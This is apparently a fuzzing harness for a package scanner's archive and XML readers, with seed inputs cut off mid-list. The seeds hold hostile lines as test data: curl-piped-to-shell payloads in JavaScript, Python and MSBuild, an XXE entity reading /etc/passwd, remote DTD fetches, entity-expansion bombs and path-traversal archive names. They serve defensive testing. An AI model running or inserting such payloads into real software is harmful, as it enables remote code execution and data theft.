"""What the fuzzers run (0.1.9, X-1): each target is a way to feed bytes to one reader of untrusted input, the
well-formed inputs to start from, the words that matter to it, and what must always be true of the answer.

A target's `run(data)` returns when the reader did what it promises, whatever the bytes: it gave an answer, or
refused with the error the reader documents. Anything else is a finding: an exception the reader does not
document, a broken promise (`check` raises `Violation`), or too much time (the driver's limit). The readers:

- `archive-tgz`, `archive-tbz2`, `archive-txz`, `archive-zip`: `registry.repo.iter_archive`, the reader of every
  package archive a registry scan, `lazaret guard` and `github:` scans open (tar by codec, and zip/wheel).
- `archive-npm-diff`: the same reader on an npm tarball against what npm writes from it (BR-4): npm's own node-tar,
  as pacote runs it (`npm_extract.cjs`, with the node on PATH and the npm beside it). A file npm writes is read,
  under the path npm writes it at, or the reader calls the archive corrupt; and `registry.npmtar`, the reader's
  model of npm's, says what npm writes. Without node and npm's node-tar it compares nothing.
- `xml`, `xml-minidom`: `safexml.ElementTree.fromstring` and `safexml.minidom.parseString`, with the options the
  scanner uses and the limits it can be given.
- `sca-*`: `scanner.sca.scan_all` over one file of each kind the inventory reads (the npm, yarn, pnpm and bun
  lockfiles, poetry.lock, uv.lock, pylock.toml, Pipfile.lock, requirements.txt, pyproject.toml, setup.py).
- `sca-bundle-index`: `scanner.sca_index.IndexedBundle`, the CVE bundle in its indexed file format, run on the bytes as
  given and on the same bytes with every checksum made right (so the checks behind the checksums run too).
- `sca-bundle-doc`: the same bundle both ways: any JSON document through `CveBundle` and through `dump_index` and back
  must say the same about every name it mentions.

Standard library plus this checkout. The seeds are built here, so no fixture is needed."""

import bz2
import gzip
import hashlib
import io
import json
import lzma
import os
import re
import shutil
import sys
import tarfile
import tempfile
import warnings
import zipfile
import zlib


class Violation(AssertionError):
    """A promise a reader makes that it did not keep; `rule` names it (the finding's signature)."""

    def __init__(self, rule, detail=""):
        super().__init__(f"{rule}: {detail}" if detail else rule)
        self.rule = rule


def check(condition, rule, detail=""):
    if not condition:
        raise Violation(rule, str(detail)[:300])


class Target:
    def __init__(self, name, summary, seeds, start, dictionary=(), max_len=65536, time_limit=2.0):
        self.name, self.summary, self.seeds, self.start = name, summary, seeds, start
        self.dictionary, self.max_len, self.time_limit = tuple(dictionary), max_len, time_limit


TARGETS = {}

#: Findings reported to the owner of the reader and not fixed yet: (target, signature without its line number)
#: -> (the finding's id in docs/0.1.9-findings.md, a small input that shows it, or None when what it shows depends on
#: the Python version). The driver lists them as known and exits 0 for them; `tests/architecture/test_fuzz_scripts.py`
#: replays each input and fails when it no longer shows the finding, so the entry goes when the reader is fixed.
KNOWN = {}   # (F-1, F-2, F-6 and F-7 were fixed in 0.1.8, b2bb0ff: docs/0.1.9-findings.md)


def known(target, signature):
    """-> the id of the known finding this is, or None."""
    entry = KNOWN.get((target, re.sub(r":\d+$", "", signature)))
    return entry[0] if entry else None


def register(name, summary, seeds, start, dictionary=(), **options):
    TARGETS[name] = Target(name, summary, seeds, start, dictionary, **options)


def pick(data, options):
    """Which of `options` this input is run with: a function of the bytes, so a finding replays the same way."""
    return options[zlib.crc32(data) % len(options)]


# ---------------------------------------------------------------------------------------------- archives

def tar_bytes(members, fmt=tarfile.GNU_FORMAT):
    """members: (name, kind, payload) with kind file | dir | sym | link (payload: the bytes, or the link's target)."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w", format=fmt) as tf:
        for name, kind, payload in members:
            info = tarfile.TarInfo(name)
            if kind == "file":
                info.size = len(payload)
                tf.addfile(info, io.BytesIO(payload))
            elif kind == "dir":
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.type = tarfile.SYMTYPE if kind == "sym" else tarfile.LNKTYPE
                info.linkname = payload.decode("utf-8")
                tf.addfile(info)
    return buf.getvalue()


NPM_FILES = [("package/package.json", "file", b'{"name": "left-pad", "version": "1.3.0", "main": "index.js", '
                                              b'"scripts": {"postinstall": "node setup.js"}}'),
             ("package/index.js", "file", b"module.exports = function pad(s, n) { return String(s).padStart(n); };\n"),
             ("package/lib", "dir", b""),
             ("package/lib/util.js", "file", b"const cp = require('child_process');\nexports.run = c => cp.execSync(c);\n"),
             ("package/link.js", "sym", b"index.js"),
             ("package/README.md", "file", b"# left-pad\n")]
SDIST_FILES = [("pkg-1.0/PKG-INFO", "file", b"Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n"),
               ("pkg-1.0/setup.py", "file", b"from setuptools import setup\nsetup(name='pkg', version='1.0')\n"),
               ("pkg-1.0/pkg/__init__.py", "file", b"import os\nVALUE = os.environ.get('HOME')\n"),
               ("pkg-1.0/pkg/copy.py", "link", b"pkg-1.0/pkg/__init__.py")]
ODD_FILES = [("package/a.js", "file", b"1"), ("package/a.js", "file", b"2"), ("../escape.js", "file", b"x"),
             ("/etc/abs.js", "file", b"x"), ("package/a/../../b.js", "file", b"x"), ("package\\win\\c.js", "file", b"x"),
             ("package/" + "d/" * 60 + "deep.js", "file", b"x"), ("package/long-" + "n" * 150 + ".js", "file", b"x"),
             ("package/empty", "file", b""), ("package/dangling", "sym", b"../../outside"),
             ("package/loop1", "sym", b"loop2"), ("package/loop2", "sym", b"loop1"),
             ("package/hard", "link", b"package/a.js")]


def tar_seeds():
    return [tar_bytes(NPM_FILES), tar_bytes(SDIST_FILES, tarfile.PAX_FORMAT), tar_bytes(ODD_FILES),
            tar_bytes(NPM_FILES, tarfile.PAX_FORMAT), tar_bytes([]), tar_bytes(NPM_FILES) + tar_bytes(SDIST_FILES),
            tar_bytes(NPM_FILES) + b"trailing"]


def tgz_seeds():
    tars = tar_seeds()
    return [gzip.compress(t, mtime=0) for t in tars] + [tars[0], gzip.compress(tars[0], mtime=0) * 2]


def tbz2_seeds():
    return [bz2.compress(t) for t in tar_seeds()] + [tar_seeds()[1]]


def txz_seeds():
    return [lzma.compress(t, format=lzma.FORMAT_XZ) for t in tar_seeds()] + [lzma.compress(tar_seeds()[0],
                                                                                        format=lzma.FORMAT_ALONE)]


def zip_bytes(entries, method=zipfile.ZIP_DEFLATED, comment=b""):
    """entries: (name, payload, kind) with kind file | dir | symlink."""
    buf = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")                     # a duplicate name is the point
        with zipfile.ZipFile(buf, "w", method) as zf:
            for name, payload, kind in entries:
                info = zipfile.ZipInfo(name, (1980, 1, 1, 0, 0, 0))
                info.compress_type = method
                if kind == "dir":
                    info.external_attr = 0o40755 << 16
                elif kind == "symlink":
                    info.external_attr = 0o120777 << 16
                else:
                    info.external_attr = 0o100644 << 16
                zf.writestr(info, payload)
            zf.comment = comment
    return buf.getvalue()


WHEEL_FILES = [("pkg/__init__.py", b"import socket\n", "file"), ("pkg/data/", b"", "dir"),
               ("pkg/core.py", b"def f():\n    return 1\n", "file"), ("pkg-1.0.dist-info/METADATA", b"Name: pkg\nVersion: 1.0\n", "file"),
               ("pkg-1.0.dist-info/WHEEL", b"Wheel-Version: 1.0\n", "file"), ("pkg-1.0.dist-info/RECORD", b"pkg/__init__.py,,\n", "file"),
               ("pkg/link.py", b"__init__.py", "symlink")]
ODD_ZIP = [("a.py", b"1", "file"), ("a.py", b"2", "file"), ("../escape.py", b"x", "file"), ("/abs.py", b"x", "file"),
           ("dir\\win.py", b"x", "file"), ("c:/drive.py", b"x", "file"), ("e" * 300 + ".py", b"x", "file"), ("empty", b"", "file")]


def zip_seeds():
    return [zip_bytes(WHEEL_FILES), zip_bytes(WHEEL_FILES, zipfile.ZIP_STORED), zip_bytes(WHEEL_FILES, zipfile.ZIP_BZIP2),
            zip_bytes(WHEEL_FILES, zipfile.ZIP_LZMA), zip_bytes(ODD_ZIP), zip_bytes([]), zip_bytes(WHEEL_FILES, comment=b"note"),
            zip_bytes(ODD_ZIP, zipfile.ZIP_STORED)]


REASONS = (None, "member", "files", "total", "time", "corrupt")
BUDGET_TOTAL = 32 * 1024 * 1024


def read_archive(repo, data, container, artifact):
    """-> a summary of everything `iter_archive` yields, after checking what it promises of each part."""
    budget = repo.Budget(total=BUDGET_TOTAL)
    anomalies, summary, stopped, total, files = [], [], None, 0, 0
    for item in repo.iter_archive(data, container, artifact, budget=budget, anomalies=anomalies):
        check(stopped is None, "archive-after-stop", f"{item[0]!r} after a {stopped!r} member")
        check(isinstance(item, repo.Member) and len(item) == 4, "archive-member-shape", repr(item)[:80])
        rel, size, raw, reason = item
        check(isinstance(rel, str) and rel != "", "archive-path-type", repr(rel))
        check(isinstance(size, int) and not isinstance(size, bool) and size >= 0, "archive-size-type", repr(size))
        check(isinstance(raw, (bytes, bytearray)), "archive-bytes-type", type(raw))
        check(reason in REASONS, "archive-reason", repr(reason))
        check(isinstance(item.detail, str), "archive-detail-type", repr(item.detail))
        if reason is None:
            check(size == len(raw), "archive-real-size", f"{rel!r}: {size} declared, {len(raw)} read")
            check(size <= repo.MAX_MEMBER, "archive-member-limit", f"{rel!r}: {size}")
            check(not rel.startswith("/") and ".." not in rel.split("/") and "\\" not in rel and rel not in (".", ""),
                  "archive-member-path", repr(rel))
            total += len(raw)
            files += 1
        elif reason == "member":
            check(len(raw) <= repo.SAMPLE, "archive-sample-limit", f"{rel!r}: {len(raw)} bytes")
        elif reason in ("files", "total", "time"):
            stopped = reason
        summary.append((rel, size, hashlib.sha1(bytes(raw)).digest(), reason, item.detail))
    check(total <= BUDGET_TOTAL, "archive-budget", f"{total} bytes read against {BUDGET_TOTAL}")
    check(files <= repo.MAX_FILES, "archive-file-limit", files)
    for anomaly in anomalies:
        check(isinstance(anomaly, tuple) and len(anomaly) == 3 and all(isinstance(x, str) for x in anomaly),
              "archive-anomaly-shape", repr(anomaly)[:100])
    return summary, anomalies


def archive_target(container, artifacts):
    def start():
        from lazaret.registry import repo

        def run(data):
            artifact = pick(data, artifacts)
            first = read_archive(repo, data, container, artifact)
            check(first == read_archive(repo, data, container, artifact), "archive-deterministic", container)
        return run, lambda: None
    return start


TAR_WORDS = (b"ustar\x0000", b"ustar  \x00", b"././@LongLink", b"pax_global_header", b"0000644\x00", b"00000000000\x00",
             b"package/", b"../", b"/", b"\x00" * 512, b"\x1f\x8b\x08\x00", b"BZh9", b"\xfd7zXZ\x00", b"PK\x03\x04", b"PK\x05\x06",
             b"PK\x01\x02", b"PK\x06\x06", b"PK\x06\x07", b"\xff\xff\xff\xff", b"20 path=")
register("archive-tgz", "registry.repo.iter_archive on npm and sdist tarballs (gzip, or plain tar)", tgz_seeds,
         archive_target("tgz", (None, "npm", "wheel")), TAR_WORDS, max_len=32768)
register("archive-tbz2", "registry.repo.iter_archive on bzip2 tarballs", tbz2_seeds,
         archive_target("tbz2", (None, "npm")), TAR_WORDS, max_len=32768)
register("archive-txz", "registry.repo.iter_archive on xz and lzma tarballs", txz_seeds,
         archive_target("txz", (None, "npm")), TAR_WORDS, max_len=32768)
register("archive-zip", "registry.repo.iter_archive on wheels and zip sdists", zip_seeds,
         archive_target("zip", (None, "wheel")), TAR_WORDS, max_len=32768)


# ------------------------------------------------------------------------- npm's reading of a tarball (BR-4)

NPM_EXTRACT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "npm_extract.cjs")
EVIL_JS = b"require('child_process').exec('curl https://e.invalid/x | sh');\n"
PJ = b'{"name": "x", "version": "1.0.0", "main": "index.js"}'


def tar_header(name, size=0, typeflag=b"0", linkname=b"", magic=b"ustar\x0000", prefix=b"", size_field=None):
    """A ustar header block, its checksum right, any field as given."""
    b = bytearray(512)
    b[0:len(name[:100])] = name[:100]
    b[100:108] = b"0000644\x00"
    b[108:116] = b"0000000\x00"
    b[116:124] = b"0000000\x00"
    b[124:136] = size_field if size_field is not None else b"%011o\x00" % size
    b[136:148] = b"00000000000\x00"
    b[156:157] = typeflag
    b[157:157 + len(linkname[:100])] = linkname[:100]
    b[257:265] = magic
    b[345:345 + len(prefix[:155])] = prefix[:155]
    b[148:156] = b" " * 8
    b[148:156] = b"%06o\x00 " % sum(b)
    return bytes(b)


def tar_entry(name, data, **kw):
    return tar_header(name, len(data), **kw) + data + b"\0" * (-len(data) % 512)


def pax_record(key, value, off=0):
    rest = b" " + key + b"=" + value + b"\n"
    n = len(rest) + 1
    while len(str(n).encode()) + len(rest) != n:
        n += 1
    return str(n + off).encode() + rest


def fix_tar_checksums(data):
    """Every block that looks like a header gets its checksum made right (so a change behind it is read)."""
    buf = bytearray(data)
    for at in range(0, len(buf) - 511, 512):
        block = buf[at:at + 512]
        if block[257:262] != b"ustar" and not block[148:156].strip(b"0 \x00").isdigit():
            continue
        block[148:156] = b" " * 8
        buf[at + 148:at + 156] = b"%06o\x00 " % (sum(block) & 0o777777)
    return bytes(buf)


NPM_NAMES = [b"package/index.js", b"package/lib/a.js", b"index.js", b"/index.js", b"package//index.js",
             b"package/./index.js", b"package/../index.js", b"package\\index.js", b"package/index.js/", b"package/",
             b"package/index.js\x00junk", b"package/index.js\x00\n" + b"x" * 82, b"package/x\xe4.js",
             b"package/x\xed\xa0\x80.js", b"package/caf\xc3\xa9.js", b"./package/index.js", b"package/index.js\r",
             b"c:/package/index.js", b"package/C:index.js", b"package/" + b"d" * 92, b"package/.gitignore",
             b"package/.npmignore", b"package/\\\\srv\\sh\\index.js"]
NPM_TYPES = [b"0", b"\x00", b"7", b"5", b"1", b"2", b"x", b"g", b"L", b"K", b"N", b"X", b"S", b"D", b"Z", b"A", b"3",
             b"6", b"\xff"]
NPM_PAX = [b"package/index.js", b"package/p.js", b"package/a\n.js", b"12345", b"", b"package/\xe4.js", b"/index.js",
           b"package/lib/../index.js"]


def npm_generated(rng):
    """A tarball built from the parts the readers disagree on (names, types, prefixes, pax records, long names)."""
    parts = [tar_entry(b"package/package.json", PJ)]
    for _ in range(rng.randint(1, 4)):
        roll = rng.random()
        payload = rng.choice([EVIL_JS, b"module.exports = 1;\n", b"", b"x" * rng.choice([1, 511, 512, 513, 1500])])
        if roll < 0.25:
            records = []
            for _r in range(rng.randint(1, 3)):
                key = rng.choice([b"path", b"size", b"linkpath", b"comment", b"mtime", b"SCHILY.dev", b"uid"])
                value = rng.choice(NPM_PAX) if key in (b"path", b"linkpath") else rng.choice(
                    [b"0", b"5", b"600", b"abc", b"-1", b" 7", b"1e3", b"999999999999"])
                records.append(pax_record(key, value, rng.choice([0, 0, 0, 1, -1])))
            parts.append(tar_entry(rng.choice([b"PaxHeader/x", b"pax_global_header", b"././@PaxHeader"]),
                                   b"".join(records), typeflag=rng.choice([b"x", b"g", b"X"])))
        elif roll < 0.35:
            parts.append(tar_entry(b"././@LongLink", rng.choice(NPM_PAX) + rng.choice([b"\x00", b""]),
                                   typeflag=rng.choice([b"L", b"K", b"N"])))
        kw = {}
        if rng.random() < 0.3:
            kw["prefix"] = rng.choice([b"package", b"\x00" * 130 + b"x", b"pkg/sub", b"\x00x", b"a" * 155,
                                       b"package\x00" + b"z" * 140])
        if rng.random() < 0.2:
            kw["magic"] = rng.choice([b"ustar\x0000", b"ustar  \x00", b"\x00" * 8, b"ustar\x00xx"])
        if rng.random() < 0.15:
            kw["linkname"] = rng.choice([b"x", b"index.js", b"../x"])
        if rng.random() < 0.15:
            kw["size_field"] = rng.choice([b"\x80" + b"\x00" * 10 + b"\x05", b"\xff" * 12, b"     12    \x00",
                                           b"00000000012 ", b"12x\x00", b"\x81" + b"\x00" * 11, b"-0000000012\x00"])
        typeflag = rng.choice(NPM_TYPES) if rng.random() < 0.4 else b"0"
        parts.append(tar_entry(rng.choice(NPM_NAMES), payload, typeflag=typeflag, **kw))
        if rng.random() < 0.1:
            parts.append(b"\0" * 512 * rng.choice([1, 2]))
    if rng.random() < 0.2:
        rng.shuffle(parts)
    return b"".join(parts) + b"\0" * 1024


def npm_diff_seeds():
    import random
    found = [  # what the differential run found (each an archive the reader now calls corrupt)
        tar_entry(b"package/package.json", PJ) + tar_entry(b"index.js", EVIL_JS, prefix=b"\x00" * 130 + b"x" * 25),
        tar_entry(b"pax_global_header", pax_record(b"path", b"package/global.js"), typeflag=b"g")
        + tar_entry(b"package/package.json", PJ) + tar_entry(b"package/index.js", EVIL_JS),
        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/docs/", tar_entry(b"package/index.js", EVIL_JS)),
        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/n.txt", tar_entry(b"package/index.js", EVIL_JS),
                                                           linkname=b"x"),
        tar_entry(b"package/package.json", PJ) + tar_entry(b"PaxHeader/x", pax_record(b"path", b"package/a\n.js"),
                                                           typeflag=b"x") + tar_entry(b"package/index.js", EVIL_JS),
        tar_entry(b"package/package.json", PJ) + tar_entry(b"././@LongLink", b"package/index.js\x00", typeflag=b"N")
        + tar_entry(b"package/notes.js", EVIL_JS),
        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/x\xe4.js", EVIL_JS),
        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/a.js\x00\n" + b"b" * 86, EVIL_JS),
        tar_entry(b"package/package.json", PJ) + tar_entry(b"package/\\\\srv\\sh\\index.js", EVIL_JS)]
    rng = random.Random("archive-npm-diff seeds")
    return ([f + b"\0" * 1024 for f in found] + tar_seeds()[:4] + [tar_bytes(NPM_FILES, tarfile.USTAR_FORMAT)]
            + [npm_generated(rng) for _ in range(16)])


def npm_predicted(data):
    """What registry.npmtar says npm writes from this tar stream: {path: sha256}, a later entry over an earlier
    one, a .gitignore as .npmignore unless one came first; None where it stops on what it does not follow."""
    from lazaret.registry import npmtar
    node = npmtar.NodeTar()
    node.feed(data)
    node.finish()
    if any(code.startswith("LAZARET_") for code, _m in node.warnings) or node.dirs:
        return None                                    # (a directory over a file, or a file over one: not modelled)
    out, ignores = {}, set()
    for path, start, size in node.files:
        digest = hashlib.sha256(data[start:start + size]).hexdigest()
        rel = npmtar.written_path(path)
        if rel is None:
            continue
        base = rel.rsplit("/", 1)[-1]
        if base == ".npmignore":
            ignores.add(rel)
        elif base == ".gitignore":
            if rel[:-len(".gitignore")] + ".npmignore" in ignores:
                continue
            rel = rel[:-len(".gitignore")] + ".npmignore"
        out[rel] = digest
    if any(other.startswith(rel + "/") for rel in out for other in out):
        return None
    return out


def npm_diff_start():
    import subprocess
    from lazaret.registry import repo
    tmp = tempfile.mkdtemp(prefix="lz-npm-diff-")
    state = {"proc": None}

    def end(proc):
        for pipe in (proc.stdin, proc.stdout):
            try:
                pipe.close()
            except OSError:
                pass
        proc.kill()
        proc.wait()

    def spawn():
        node = shutil.which("node")
        if not node:
            return None
        proc = subprocess.Popen([node, NPM_EXTRACT], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.DEVNULL, text=True, encoding="utf-8")
        probe = os.path.join(tmp, "probe.tar")
        with open(probe, "wb") as fh:
            fh.write(tar_bytes(NPM_FILES[:2]))
        try:
            proc.stdin.write(json.dumps({"path": probe}) + "\n")
            proc.stdin.flush()
            answer = proc.stdout.readline()
        except OSError:
            answer = ""
        if not answer:                                 # (npm's node-tar not found beside this node)
            end(proc)
            return None
        return proc

    def npm_writes(path):
        proc = state["proc"]
        try:
            proc.stdin.write(json.dumps({"path": path}) + "\n")
            proc.stdin.flush()
            line = proc.stdout.readline()
        except OSError:
            line = ""
        if not line:                                   # node-tar threw on it: npm's install fails there
            end(proc)
            state["proc"] = spawn()
            return None
        return json.loads(line)

    state["proc"] = spawn()

    def run(data):
        if state["proc"] is None:
            return
        if zlib.crc32(data) % 2 == 0:
            data = fix_tar_checksums(data)
        path = os.path.join(tmp, "in.tar")
        with open(path, "wb") as fh:
            fh.write(data)
        npm = npm_writes(path)
        if npm is None or not npm["ok"]:
            return
        written = {rel: digest for rel, digest, _size in npm["files"] if digest != "other"}
        predicted = npm_predicted(data)
        if predicted is not None:
            check(predicted == written, "npm-model", f"registry.npmtar says {sorted(predicted)[:6]}, npm writes "
                                                     f"{sorted(written)[:6]}")
        read, stopped = {}, False
        for m in repo.iter_archive(data, "tgz", "npm", budget=repo.Budget(total=BUDGET_TOTAL)):
            if m[3] is None:
                read.setdefault(hashlib.sha256(bytes(m[2])).hexdigest(), set()).add(m[0])
            else:
                stopped = True
        if stopped:
            return
        for rel, digest in written.items():
            rels = read.get(digest)
            check(rels, "npm-unread", f"npm writes {rel!r}, whose bytes the reader read nowhere")
            names = {rel, rel[:-len(".npmignore")] + ".gitignore" if rel.endswith(".npmignore") else rel}
            names |= {"/".join(p for p in n.replace("\\", "/").split("/") if p not in ("", ".")) for n in names}
            check(names & rels, "npm-elsewhere", f"npm writes {rel!r}, the reader read its bytes as {sorted(rels)}")

    def close():
        if state["proc"] is not None:
            end(state["proc"])
        shutil.rmtree(tmp, ignore_errors=True)
    return run, close


register("archive-npm-diff", "registry.repo.iter_archive on npm tarballs against npm's own node-tar (BR-4)",
         npm_diff_seeds, npm_diff_start, TAR_WORDS + (b"././@LongLink", b"\x00" * 130), max_len=32768)




# ---------------- an sdist against pip's own unpacking (BR-4, F-11) ----------------
# pip unpacks an sdist with its own code (pip/_internal/utils/unpacking.py) before it builds it: the top folder taken
# off only when every member has the same one, a `..` resolved through the path. `fuzz_pip_extract.py` runs that code
# with each Python here that has pip, and what it writes is checked against what the scan read: every file pip writes
# was read, at the path pip writes it, or the scan called the archive corrupt.
PIP_EXTRACT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fuzz_pip_extract.py")
PIP_SETUP = b"from setuptools import setup\nsetup(name='pkg', version='1.0')\n"
PIP_EVIL = b"import os\nos.system('curl https://e.invalid/x | sh')\n"
PIP_NAMES = ["pkg-1.0/setup.py", "pkg-1.0/pkg/__init__.py", "setup.py", "/pkg-1.0/setup.py", "pkg-1.0//setup.py",
             "pkg-1.0/./setup.py", "./pkg-1.0/setup.py", "./setup.py", "pkg-1.0/x/../setup.py", "pkg-1.0/../setup.py",
             "x/../pkg-1.0/setup.py", "pkg-1.0\\setup.py", "pkg-1.0\\pkg\\__init__.py", "pkg-1.0/pkg\\__init__.py",
             "pkg-1.0/", "other/", "pkg-1.0/pkg/", "pkg-1.0/x/", "pkg-1.0/x/a.py", "C:/pkg-1.0/setup.py",
             "pkg-1.0/a/b/../../setup.py", "pkg-1.0/a/../../setup.py", "pkg-2.0/setup.py", "pkg-1.0/PKG-INFO",
             "pkg-1.0/pkg/../pkg/__init__.py", "/setup.py", "pkg-1.0/x/../../pkg-1.0/setup.py"]


def pip_sdist(members, container="tgz", fmt=tarfile.PAX_FORMAT):
    """An sdist of (name, bytes) members in order (a name ending in `/` a folder): an uncompressed tar, or a zip."""
    buf = io.BytesIO()
    if container == "zip":
        with warnings.catch_warnings(), zipfile.ZipFile(buf, "w") as zf:
            warnings.simplefilter("ignore")            # (a name twice is on purpose)
            for name, data in members:
                zf.writestr(name, b"" if name.endswith("/") else data)
        return buf.getvalue()
    with tarfile.open(fileobj=buf, mode="w", format=fmt) as tf:
        for name, data in members:
            info = tarfile.TarInfo(name.rstrip("/") or name)
            if name.endswith("/"):
                info.type = tarfile.DIRTYPE
                tf.addfile(info)
            else:
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def pip_generated(rng):
    """An sdist from the names pip and the scan could place apart (folders, `.`, `..`, slashes, other tops)."""
    members = [("pkg-1.0/PKG-INFO", b"Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n")]
    for _ in range(rng.randint(1, 5)):
        members.append((rng.choice(PIP_NAMES), rng.choice([PIP_EVIL, PIP_SETUP, b"x = 1\n", b""])))
    if rng.random() < 0.3:
        rng.shuffle(members)
    if rng.random() < 0.3:
        return pip_sdist(members, "zip")
    try:
        return pip_sdist(members, fmt=rng.choice([tarfile.PAX_FORMAT, tarfile.GNU_FORMAT, tarfile.USTAR_FORMAT]))
    except ValueError:                                  # (a name ustar cannot hold)
        return pip_sdist(members)


def pip_diff_seeds():
    import random
    found = [  # what the differential run found (each an archive the reader now reads where pip writes, or corrupt)
        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("pkg-1.0/x/a.py", b"\n"), ("pkg-1.0/x/../setup.py", PIP_EVIL)]),
        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("setup.py", PIP_EVIL)]),
        pip_sdist([("./pkg-1.0/setup.py", PIP_SETUP), ("./pkg-1.0/pkg/__init__.py", PIP_EVIL)]),
        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("/index.js", PIP_EVIL)]),
        pip_sdist([("pkg-1.0/setup.py", PIP_SETUP), ("pkg-1.0/x/../setup.py", PIP_EVIL)], "zip")]
    rng = random.Random("archive-pip-diff seeds")
    return found + [pip_generated(rng) for _ in range(16)]


def pip_diff_start():
    import subprocess
    from lazaret.registry import repo
    tmp = tempfile.mkdtemp(prefix="lz-pip-diff-")

    def end(proc):
        for pipe in (proc.stdin, proc.stdout):
            try:
                pipe.close()
            except OSError:
                pass
        proc.kill()
        proc.wait()

    def spawn(python):
        try:
            proc = subprocess.Popen([python, "-I", PIP_EXTRACT], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                    stderr=subprocess.DEVNULL, text=True, encoding="utf-8")
        except OSError:
            return None
        probe = os.path.join(tmp, "probe-1.0.tar.gz")
        with open(probe, "wb") as fh:
            fh.write(gzip.compress(pip_sdist([("probe-1.0/setup.py", PIP_SETUP)]), mtime=0))
        try:
            proc.stdin.write(json.dumps({"path": probe}) + "\n")
            proc.stdin.flush()
            answer = proc.stdout.readline()
        except OSError:
            answer = ""
        if not answer:                                 # (no pip in that Python)
            end(proc)
            return None
        return proc

    pythons = []                                       # (this Python, and the others here, each pip as it is there)
    for python in [sys.executable] + [shutil.which(f"python3.{minor}") for minor in range(8, 15)]:
        if python and os.path.realpath(python) not in {os.path.realpath(p) for p in pythons}:
            pythons.append(python)
    procs = {python: spawn(python) for python in pythons}

    def pip_writes(python, path):
        proc = procs[python]
        try:
            proc.stdin.write(json.dumps({"path": path}) + "\n")
            proc.stdin.flush()
            line = proc.stdout.readline()
        except OSError:
            line = ""
        if not line:
            end(proc)
            procs[python] = spawn(python)
            return None
        return json.loads(line)

    def run(data):
        if zlib.crc32(data) % 3 == 0:                  # (a third of the runs: an sdist built from the input's hash)
            import random
            data = pip_generated(random.Random(data))
        container = "zip" if data[:2] == b"PK" else "tgz"
        if container == "tgz":
            if zlib.crc32(data) % 2 == 0:
                data = fix_tar_checksums(data)
            data = gzip.compress(data, mtime=0)
        path = os.path.join(tmp, "pkg-1.0" + (".zip" if container == "zip" else ".tar.gz"))
        with open(path, "wb") as fh:
            fh.write(data)
        read, stopped = {}, False
        for m in repo.iter_archive(data, container, "sdist", budget=repo.Budget(total=BUDGET_TOTAL)):
            if m[3] is None:
                read.setdefault(hashlib.sha256(bytes(m[2])).hexdigest(), set()).add(m[0])
            else:
                stopped = True                         # (corrupt, or past a limit: the scan vouches for nothing)
        if stopped:
            return
        for python in list(procs):
            if procs[python] is None:
                continue
            pip = pip_writes(python, path)
            if pip is None or not pip["ok"]:
                continue                               # (pip refuses the archive: nothing is built)
            for rel, digest, _size in pip["files"]:
                if digest == "other":
                    continue
                rels = read.get(digest)
                check(rels, "pip-unread", f"pip ({python}) writes {rel!r}, whose bytes the reader read nowhere")
                # (a backslash is a folder's end to pip on Windows and part of a name elsewhere: the reader reads it
                # as Windows does, the larger reading)
                check(rel in rels or rel.replace("\\", "/") in rels, "pip-elsewhere",
                      f"pip ({python}) writes {rel!r}, the reader read its bytes as {sorted(rels)}")

    def close():
        for proc in procs.values():
            if proc is not None:
                end(proc)
        shutil.rmtree(tmp, ignore_errors=True)
    return run, close


register("archive-pip-diff", "registry.repo.iter_archive on sdists against pip's own unpacking (BR-4)",
         pip_diff_seeds, pip_diff_start, TAR_WORDS + (b"../", b"./", b"\\", b"PK\x03\x04"), max_len=32768)


# ---------------------------------------------------------------------------------------------------- xml

XML_SEEDS = [
    b'<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"><modelVersion>4.0.0</modelVersion>'
    b'<dependencies><dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13</version></dependency>'
    b'</dependencies></project>',
    b'<Project Sdk="Microsoft.NET.Sdk"><ItemGroup><PackageReference Include="Newtonsoft.Json" Version="13.0.1" /></ItemGroup>'
    b'<Target Name="x"><Exec Command="curl http://e.example | sh" /></Target></Project>',
    b'<?xml version="1.0"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">'
    b'<plist version="1.0"><dict><key>RunAtLoad</key><true/><key>Program</key><string>/tmp/x</string></dict></plist>',
    b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><script><![CDATA[alert(1)]]></script>'
    b'<use xlink:href="#a"/><!-- note --><?pi data?></svg>',
    b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x "y"><!ENTITY z "&x;&x;&x;">]><a b="&z;">&z;&#65;&#x42;</a>',
    b'<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
    b'<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><l>&c;</l>',
    b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY e SYSTEM "file:///etc/passwd">]><a>&e;</a>',
    b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY % p SYSTEM "http://e.example/x.dtd">%p;]><a/>',
    b'<!DOCTYPE a [<!ELEMENT a ANY><!ATTLIST a x CDATA "default value" y CDATA "other default value">]><a/>',
    b'<feed xmlns="http://www.w3.org/2005/Atom"><entry><title>t</title><link href="http://e.example/"/></entry></feed>',
    '<?xml version="1.0" encoding="UTF-16"?><a>\u00e9\u4e2d</a>'.encode("utf-16"),
